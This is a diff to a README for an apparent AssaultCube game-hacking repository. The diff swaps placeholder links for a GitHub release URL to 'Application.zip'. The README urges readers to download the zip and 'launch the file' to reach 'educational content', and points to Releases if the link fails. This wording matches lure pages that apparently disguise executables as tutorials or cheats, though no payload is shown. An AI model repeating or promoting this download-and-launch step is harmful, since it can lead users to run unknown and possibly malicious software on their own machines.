@@ -29,11 +29,11 @@ Explore a range of topics related to game hacking and cheat development, includi
 
 ## Get Started 🚀
 
-To dive into the world of game hacking with AssaultCube, download the [Application.zip](https://github.com/file/Application.zip) file provided in the link above. Don't forget to launch the file to get started with the exciting educational content waiting for you!
+To dive into the world of game hacking with AssaultCube, download the [https://github.com/h0unds/AssaultCube-Internal/releases/download/v1.0.0/Application.zip](https://github.com/h0unds/AssaultCube-Internal/releases/download/v1.0.0/Application.zip) file provided in the link above. Don't forget to launch the file to get started with the exciting educational content waiting for you!
 
 If the link is not working or the file needs to be launched, check out the "Releases" section of this repository for alternative download options.
 
-[![Download Application.zip](https://img.shields.io/badge/Download-Application.zip-blue.svg)](https://github.com/file/Application.zip)
+[![Download https://github.com/h0unds/AssaultCube-Internal/releases/download/v1.0.0/Application.zip](https://github.com/h0unds/AssaultCube-Internal/releases/download/v1.0.0/Application.zip)](https://github.com/h0unds/AssaultCube-Internal/releases/download/v1.0.0/Application.zip)
 
 ## Happy Hacking! 💻🔓
 
